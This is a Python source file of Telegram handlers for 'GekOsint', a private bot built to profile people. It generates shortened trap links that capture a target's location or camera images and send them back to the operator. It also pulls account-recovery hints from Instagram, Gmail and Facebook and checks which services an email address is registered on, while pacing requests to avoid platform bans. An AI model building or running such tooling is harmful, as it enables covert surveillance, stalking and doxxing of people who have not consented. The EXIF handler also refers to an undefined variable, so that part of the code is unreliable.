# -*- coding: utf-8 -*-
from telegram import Update
from telegram.ext import ContextTypes
from ui.menus import main_menu, back_btn
from ui.templates import (
    format_ip_result, format_phone_result_with_ip, format_username_result,
    format_email_result, format_exif_result, format_whatsapp_result,
    format_people_result, format_dns_result,
    format_geoloc_coords, format_geoloc_ip, format_geoloc_webrtc, format_wifi_scan,
    format_github_recon, format_ig_osint,
    format_gmail_osint, format_fb_osint,
    format_email_recon,
)
from modules.ip_lookup import get_ip_info
from modules.phone_lookup import analyze_phone
from modules.username_search import search_username
from modules.email_analysis import analyze_email
from modules.tracking import generate_tracking_page
from modules.exif_extract import get_exif
from modules.whatsapp_osint import analyze_whatsapp
from modules.people_search import search_people
from modules.dns_lookup import get_dns_info
from modules.geolocation import (
    get_ip_geolocation, scan_wifi_networks,
    check_webrtc_leak, extract_google_maps_location
)
from modules.github_recon import github_recon
from modules.ig_osint import ig_lookup, check_ig_rate_limit
from modules.gmail_osint import gmail_lookup, check_gmail_rate_limit
from modules.fb_osint import fb_lookup, check_fb_rate_limit
from modules.email_recon import email_recon, check_email_recon_rate_limit
from utils.apis import deploy_html, shorten_url, generate_text_report, upload_bytes
from utils.access import load_authorized_users, add_user, remove_user, get_all_users
from utils.rate_limit import check_rate_limit
from utils.parse import extract_phone_and_target
from config import BOT_TOKEN, logger, ADMIN_ID
from datetime import datetime
import re
import asyncio

# ── Mensajes de acceso ────────────────────────────────────────────────────────
DENIED_MSG = (
    "🔒 <b>ACCESO DENEGADO</b>\n"
    "━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    "⛔ No tienes autorización para usar este bot.\n\n"
    "📋 <b>Tu información:</b>\n"
    "• ID: <code>{user_id}</code>\n"
    "• Nombre: {name}\n"
    "• Username: @{username}\n\n"
    "🛡️ <i>Bot privado — solo usuarios autorizados.</i>"
)

RATE_LIMIT_MSG = (
    "⏳ <b>Demasiadas consultas.</b>\n"
    "Espera <b>{seconds}s</b> antes de continuar."
)


# ── Control de acceso ─────────────────────────────────────────────────────────

def is_authorized(user_id: int) -> bool:
    return user_id in get_all_users()


async def check_access(update: Update, context: ContextTypes.DEFAULT_TYPE = None) -> bool:
    user = update.effective_user
    if not user:
        return False
    if is_authorized(user.id):
        return True

    logger.warning(f"🚫 Acceso denegado — {user.full_name} (@{user.username}) ID:{user.id}")
    msg = DENIED_MSG.format(
        user_id=user.id,
        name=user.full_name or "N/A",
        username=user.username or "sin_username",
    )
    if update.callback_query:
        await update.callback_query.answer("🔒 Acceso denegado", show_alert=True)
    elif update.message:
        await update.message.reply_text(msg, parse_mode="HTML")

    if context and ADMIN_ID:
        try:
            now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            alert = (
                f"🚨 <b>INTENTO DE ACCESO</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"👤 <b>Nombre:</b> {user.full_name}\n"
                f"🆔 <b>ID:</b> <code>{user.id}</code>\n"
                f"📛 <b>Username:</b> @{user.username or 'N/A'}\n"
                f"🕐 <b>Hora:</b> {now}\n"
            )
            await context.bot.send_message(ADMIN_ID, alert, parse_mode="HTML")
        except Exception:
            pass
    return False


async def check_rate(update: Update, user_id: int) -> bool:
    allowed, wait = check_rate_limit(user_id)
    if not allowed:
        txt = RATE_LIMIT_MSG.format(seconds=wait)
        if update.callback_query:
            await update.callback_query.answer(f"⏳ Espera {wait}s", show_alert=True)
        elif update.message:
            await update.message.reply_text(txt, parse_mode="HTML")
    return allowed


# ── /admin ────────────────────────────────────────────────────────────────────

async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        return

    args = context.args
    if not args:
        users = get_all_users()
        user_list = "\n".join(f"  <code>{u}</code>" for u in sorted(users))
        msg = (
            "🛡️ <b>Panel de Administración — GekOsint</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"👥 <b>Usuarios autorizados:</b> {len(users)}\n"
            f"{user_list}\n\n"
            "📝 <b>Comandos:</b>\n"
            "• <code>/admin add ID</code>    — Añadir usuario\n"
            "• <code>/admin remove ID</code> — Eliminar usuario\n"
            "• <code>/admin stats</code>     — Ver estadísticas\n"
        )
        await update.message.reply_text(msg, parse_mode="HTML")
        return

    cmd = args[0].lower()
    if cmd == "add" and len(args) > 1:
        if not args[1].isdigit():
            await update.message.reply_text(
                f"❌ El ID debe ser numérico. Recibí: <code>{args[1]}</code>\n\n"
                f"Uso: <code>/admin add 123456789</code>",
                parse_mode="HTML",
            )
            return
        if add_user(args[1]):
            await update.message.reply_text(f"✅ Usuario <code>{args[1]}</code> añadido.", parse_mode="HTML")
        else:
            await update.message.reply_text("❌ Error al añadir usuario.")
    elif cmd == "remove" and len(args) > 1:
        if not args[1].isdigit():
            await update.message.reply_text(
                f"❌ El ID debe ser numérico. Recibí: <code>{args[1]}</code>",
                parse_mode="HTML",
            )
            return
        if remove_user(args[1]):
            await update.message.reply_text(f"✅ Usuario <code>{args[1]}</code> eliminado.", parse_mode="HTML")
        else:
            await update.message.reply_text("❌ No se pudo eliminar (puede ser usuario inicial o admin).")
    elif cmd == "stats":
        await update.message.reply_text(
            f"📊 <b>Estadísticas GekOsint</b>\n"
            f"👥 Usuarios autorizados: {len(get_all_users())}\n",
            parse_mode="HTML"
        )


# ── /start y /help ────────────────────────────────────────────────────────────

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_access(update, context):
        return

    user  = update.effective_user.first_name
    total = len(get_all_users())
    txt = (
        f"👋 <b>Bienvenido, {user}</b>\n\n"
        f"🛡️ <b>GekOsint v6.0</b> — Sistema de Inteligencia OSINT\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🔍 <b>IP Lookup</b>        — Geoloc, WHOIS, puertos, blacklist\n"
        f"📱 <b>Phone Intel</b>      — Caller ID, spam, operadora, región\n"
        f"👤 <b>Username Search</b>  — 50+ plataformas + Telegram\n"
        f"📧 <b>Email Analysis</b>   — Reputación, brechas, DNS\n"
        f"💚 <b>WhatsApp OSINT</b>   — Registro, spam, Business\n"
        f"🌍 <b>Geo Tracker</b>      — Enlace trampa de ubicación\n"
        f"📸 <b>Camera Trap</b>      — Captura de cámara remota\n"
        f"🖼️ <b>EXIF Data</b>        — Metadatos, GPS, cámara\n"
        f"🧑‍💼 <b>People Search</b>    — Nombre → redes, dorks, OSINT\n"
        f"🌐 <b>Domain/DNS</b>       — WHOIS, registros, seguridad\n"
        f"📷 <b>IG OSINT</b>         — Perfil, posts, recovery hints (email/phone)\n"
        f"💻 <b>GitHub Recon</b>     — Perfil, repos, emails leakeados en commits\n"
        f"📧 <b>Gmail OSINT</b>      — Existencia, recovery hints, People API, YouTube\n"
        f"📘 <b>FB OSINT</b>         — User ID, foto, recovery hints (email/phone)\n\n"
        f"<i>🔒 {total} usuario(s) autorizado(s)</i>"
    )
    if update.callback_query:
        await update.callback_query.edit_message_text(txt, reply_markup=main_menu(), parse_mode="HTML")
    else:
        await update.message.reply_text(txt, reply_markup=main_menu(), parse_mode="HTML")


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await start(update, context)


# ── Callback handler ──────────────────────────────────────────────────────────

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if not query:
        return
    if not await check_access(update, context):
        return

    await query.answer()
    data = query.data

    if data == "start":
        await start(update, context)
        return

    # Exportar reporte
    if data == "export_txt":
        last = context.user_data.get("last_result")
        if not last:
            await query.answer("No hay datos para exportar.", show_alert=True)
            return
        await query.answer("Generando reporte…")
        report = generate_text_report("OSINT Analysis", last)
        from io import BytesIO
        bio = BytesIO(report.encode())
        bio.name = f"GekOsint_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        await context.bot.send_document(
            query.message.chat_id, bio,
            caption="🛡️ Reporte GekOsint v6.0"
        )
        return

    # Acerca de
    if data == "menu_about":
        context.user_data.pop("mode", None)
        await query.edit_message_text(
            "ℹ️ <b>GekOsint v6.0</b>\n\n"
            "🛡️ Sistema de Inteligencia OSINT\n"
            "📋 12 módulos activos\n"
            "🔒 Acceso restringido con rate limiting\n"
            "☁️ Cloud-Ready (Railway, Render, Koyeb, Fly.io)\n\n"
            "<i>Desarrollado para investigación ética y legal.</i>",
            reply_markup=back_btn(), parse_mode="HTML"
        )
        return

    # Trackers (acción inmediata)
    if data in ("menu_geo", "menu_cam"):
        if not await check_rate(update, query.from_user.id):
            return
        await query.edit_message_text(
            "⚙️ <b>Generando enlace trampa…</b>\n<i>(Puede tardar unos segundos)</i>",
            parse_mode="HTML"
        )
        type_ = "geo" if data == "menu_geo" else "cam"
        fname, html = generate_tracking_page(BOT_TOKEN, query.message.chat_id, type_)
        url = await deploy_html(html, fname)
        if url:
            short = await shorten_url(url)
            icon  = "🌍" if type_ == "geo" else "📸"
            msg   = (
                f"{icon} <b>Enlace {type_.upper()} generado</b>\n\n"
                f"🔗 <code>{short}</code>\n\n"
                f"⚠️ <i>La información capturada llegará a este chat.</i>\n"
                f"📌 El usuario debe aceptar permisos de {'ubicación' if type_ == 'geo' else 'cámara'}."
            )
            await context.bot.send_message(
                query.message.chat_id, msg, parse_mode="HTML", reply_markup=back_btn()
            )
        else:
            await context.bot.send_message(
                query.message.chat_id, "❌ Error al subir el archivo. Intenta de nuevo.",
                reply_markup=back_btn()
            )
        return

    # Módulos que esperan input del usuario
    _prompts = {
        "menu_ip":     "📡 <b>IP Lookup</b>\n\nEnvía la dirección IP a investigar:",
        "menu_phone":  (
            "📱 <b>Phone Intel</b>\n\n"
            "Envía el número con código de país:\n"
            "<code>+52 55 1234 5678</code>\n\n"
            "<i>Opcional: añade una IP o dominio para análisis combinado:\n"
            "+52... | 8.8.8.8\n"
            "+52... | example.com</i>"
        ),
        "menu_user":   "👤 <b>Username Search</b>\n\nEnvía el username a rastrear:",
        "menu_email":  "📧 <b>Email Analysis</b>\n\nEnvía el correo electrónico:",
        "menu_exif":   "🖼️ <b>EXIF Data</b>\n\nEnvía la imagen como <b>DOCUMENTO</b> (sin compresión).\n<i>No la envíes como foto normal o los metadatos se perderán.</i>",
        "menu_wa":     "💚 <b>WhatsApp OSINT</b>\n\nEnvía el número con código de país (ej: <code>+52 55 1234 5678</code>):",
        "menu_dns":    "🌐 <b>Domain/DNS</b>\n\nEnvía el dominio a investigar (ej: <code>google.com</code>):",
        "menu_people": (
            "🧑‍💼 <b>People Search</b>\n\n"
            "Envía el nombre completo a investigar:\n\n"
            "<i>Ej: Juan García\n"
            "Ej: María López Torres</i>\n\n"
            "🔍 Busca perfiles en 20+ redes, genera dorks OSINT."
        ),
        "menu_geoloc": (
            "🛰️ <b>Geo Localización</b>\n\n"
            "Envía una de estas opciones:\n\n"
            "1️⃣ <b>IP</b> → geolocalización\n"
            "2️⃣ <b>Coordenadas</b> → <code>19.4326, -99.1332</code>\n"
            "3️⃣ <b>URL de Google Maps</b> → extracción de coords"
        ),
        "menu_github": (
            "💻 <b>GitHub Recon</b>\n\n"
            "Envía un <b>username</b> de GitHub o un <b>email</b>:\n\n"
            "<code>octocat</code>\n"
            "<code>@octocat</code>\n"
            "<code>user@example.com</code>\n\n"
            "🔍 Devuelve: perfil, repos top, orgs, gists, llaves SSH/GPG y "
            "<b>emails leakeados en commits públicos</b>."
        ),
        "menu_ig": (
            "📷 <b>IG OSINT</b>\n\n"
            "Envía el <b>username</b> de Instagram (sin @):\n\n"
            "<code>cristiano</code>\n"
            "<code>nasa</code>\n\n"
            "🔍 Devuelve: perfil, posts recientes con geotags, y "
            "<b>email/teléfono parcialmente ofuscados</b> (técnica Toutatis).\n\n"
            "⏳ <i>Rate limit anti-ban: 1 consulta cada 60s, 20/hora por usuario. "
            "Es para que IG no bloquee la cuenta de sesión.</i>"
        ),
        "menu_gmail": (
            "📧 <b>Gmail / Google OSINT</b>\n\n"
            "Envía un email Gmail o de Google Workspace:\n\n"
            "<code>usuario@gmail.com</code>\n"
            "<code>contacto@miempresa.com</code>\n\n"
            "🔍 Devuelve: existencia, <b>recovery hints</b> (phone/email parcial), "
            "Gravatar, posibles canales YouTube y, si hay cookies, perfil completo "
            "vía People API (gaia ID, nombres, foto HD).\n\n"
            "⏳ <i>Rate limit anti-ban: 1/60s, 20/hora.</i>"
        ),
        "menu_fb": (
            "📘 <b>Facebook OSINT</b>\n\n"
            "Envía username, email, teléfono o user ID de FB:\n\n"
            "<code>zuck</code>\n"
            "<code>algun.usuario</code>\n"
            "<code>4</code> (user ID numérico)\n\n"
            "🔍 Devuelve: <b>recovery hints</b> (email/phone parcial), "
            "user ID numérico, foto de perfil HD, link al perfil.\n\n"
            "⏳ <i>FB es estricto — rate limit: 1/90s, 15/hora. "
            "Si nos rate-limitea, pausa global de 45 min.</i>"
        ),
        "menu_emailrecon": (
            "📨 <b>Email Multi-Platform Recon</b>\n\n"
            "Envía cualquier email:\n\n"
            "<code>persona@gmail.com</code>\n"
            "<code>contacto@empresa.com</code>\n\n"
            "🔍 Chequea contra <b>~12 servicios</b> en paralelo "
            "(X/Twitter, Microsoft, Apple, Spotify, Adobe, Pinterest, "
            "GitHub, Duolingo, Imgur, Strava, LastPass, Proton).\n\n"
            "Reporta dónde está registrado el email y, en algunos servicios, "
            "extrae <b>hints adicionales</b> como username público asociado.\n\n"
            "⏳ <i>Rate limit suave: 1/30s, 30/hora.</i>"
        ),
    }

    if data in _prompts:
        context.user_data["mode"] = data
        await query.edit_message_text(_prompts[data], reply_markup=back_btn(), parse_mode="HTML")


# ── Message handler ───────────────────────────────────────────────────────────

async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_access(update, context):
        return
    if not await check_rate(update, update.effective_user.id):
        return

    mode = context.user_data.get("mode")
    text = update.message.text

    if not mode:
        return  # Mensaje sin contexto activo

    msg = await update.message.reply_text("⏳ <b>Procesando…</b>", parse_mode="HTML")

    try:
        response = None

        if mode == "menu_ip":
            data = await asyncio.to_thread(get_ip_info, text.strip())
            response = format_ip_result(data)

        elif mode == "menu_phone":
            phone_token, target_token = extract_phone_and_target(text)
            data = await asyncio.to_thread(analyze_phone, phone_token)
            if target_token and "error" not in data:
                data["ip_intel_target"] = target_token
                data["ip_intel"] = await asyncio.to_thread(get_ip_info, target_token)
            response = format_phone_result_with_ip(data)

        elif mode == "menu_user":
            found, telegram_data = await asyncio.to_thread(search_username, text.strip())
            response = format_username_result(text.strip(), found, telegram_data)

        elif mode == "menu_email":
            data = await asyncio.to_thread(analyze_email, text.strip())
            response = format_email_result(data)

        elif mode == "menu_wa":
            data = await asyncio.to_thread(analyze_whatsapp, text.strip())
            response = format_whatsapp_result(data)

        elif mode == "menu_dns":
            data = await asyncio.to_thread(get_dns_info, text.strip())
            response = format_dns_result(data)

        elif mode == "menu_people":
            data = await asyncio.to_thread(search_people, text.strip())
            response = format_people_result(data)

        elif mode == "menu_github":
            # github_recon es async nativo (httpx) → await directo, sin to_thread
            data = await github_recon(text.strip())
            response = format_github_recon(data)

        elif mode == "menu_ig":
            # Rate limiter dedicado a IG (separado del global del bot)
            allowed, reason = check_ig_rate_limit(update.effective_user.id)
            if not allowed:
                response = (
                    f"⏳ <b>IG OSINT — rate limit</b>\n\n"
                    f"{reason}\n\n"
                    f"<i>Esto protege la cuenta de sesión de bloqueos por IG.</i>"
                )
            else:
                data = await ig_lookup(text.strip())
                response = format_ig_osint(data)

        elif mode == "menu_gmail":
            allowed, reason = check_gmail_rate_limit(update.effective_user.id)
            if not allowed:
                response = (
                    f"⏳ <b>Gmail OSINT — rate limit</b>\n\n"
                    f"{reason}\n\n"
                    f"<i>Anti-ban contra Google.</i>"
                )
            else:
                data = await gmail_lookup(text.strip())
                response = format_gmail_osint(data)

        elif mode == "menu_fb":
            allowed, reason = check_fb_rate_limit(update.effective_user.id)
            if not allowed:
                response = (
                    f"⏳ <b>FB OSINT — rate limit</b>\n\n"
                    f"{reason}\n\n"
                    f"<i>Meta es muy agresivo — esto evita que la cuenta de "
                    f"sesión se bloquee.</i>"
                )
            else:
                data = await fb_lookup(text.strip())
                response = format_fb_osint(data)

        elif mode == "menu_emailrecon":
            allowed, reason = check_email_recon_rate_limit(update.effective_user.id)
            if not allowed:
                response = (
                    f"⏳ <b>Email Recon — rate limit</b>\n\n{reason}"
                )
            else:
                data = await email_recon(text.strip())
                response = format_email_recon(data)

        elif mode == "menu_geoloc":
            clean = text.strip()
            if re.match(r"^-?\d+\.?\d*,\s*-?\d+\.?\d*$", clean):
                lat, lon = map(float, clean.split(","))
                response = format_geoloc_coords({
                    "type": "coordinates", "lat": lat, "lon": lon,
                    "map_url": f"https://www.google.com/maps?q={lat},{lon}"
                })
            elif clean.startswith("http"):
                if "maps.google" in clean or "goo.gl" in clean:
                    coords = extract_google_maps_location(clean)
                    if coords:
                        response = format_geoloc_coords({
                            "type": "google_maps_url",
                            "lat": coords["lat"], "lon": coords["lon"],
                            "map_url": coords["map_url"]
                        })
                    else:
                        response = "❌ No se pudieron extraer coordenadas del enlace."
                else:
                    webrtc = await asyncio.to_thread(check_webrtc_leak, clean)
                    response = format_geoloc_webrtc({"type": "webrtc_check", "url": clean, "result": webrtc})
            elif re.match(r"^(\d{1,3}\.){3}\d{1,3}$", clean):
                data = await asyncio.to_thread(get_ip_geolocation, clean)
                response = format_geoloc_ip(data)
            else:
                response = "❌ Formato no reconocido.\nEnvía: IP, coordenadas (<code>lat,lon</code>), o URL de Google Maps."
            context.user_data["last_result"] = response

        elif mode == "menu_exif":
            await msg.edit_text(
                "🖼️ <b>EXIF Data</b>\n\nEnvía la imagen como <b>DOCUMENTO</b> (sin compresión).",
                parse_mode="HTML", reply_markup=back_btn()
            )
            return

        if response is None:
            await msg.delete()
            return

        context.user_data["last_result"] = response
        context.user_data.pop("mode", None)
        await msg.edit_text(
            response, parse_mode="HTML",
            disable_web_page_preview=True,
            reply_markup=back_btn(show_export=True)
        )

    except Exception as e:
        logger.error(f"[handler] Error en mode={mode}: {e}", exc_info=True)
        await msg.edit_text(f"❌ Error: {e}", reply_markup=back_btn())


# ── Document/Photo handler (EXIF) ─────────────────────────────────────────────

async def document_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_access(update, context):
        return
    if context.user_data.get("mode") != "menu_exif":
        return
    if not await check_rate(update, update.effective_user.id):
        return

    msg = await update.message.reply_text("⏳ <b>Descargando y analizando metadatos…</b>", parse_mode="HTML")

    try:
        from io import BytesIO
        import mimetypes
        if update.message.document:
            file_obj = await update.message.document.get_file()
        elif update.message.photo:
            file_obj = await update.message.photo[-1].get_file()
        else:
            await msg.edit_text("❌ Por favor envía una imagen.", reply_markup=back_btn())
            return

        out = BytesIO()
        await file_obj.download_to_memory(out)
        data = await asyncio.to_thread(get_exif, img_bytes)
        response = format_exif_result(data)
        context.user_data["last_result"] = response
        context.user_data.pop("mode", None)
        await msg.edit_text(
            response, parse_mode="HTML",
            disable_web_page_preview=True,
            reply_markup=back_btn(show_export=True),
        )
    except Exception as e:
        await msg.edit_text(f"❌ Error procesando imagen: {e}", reply_markup=back_btn())
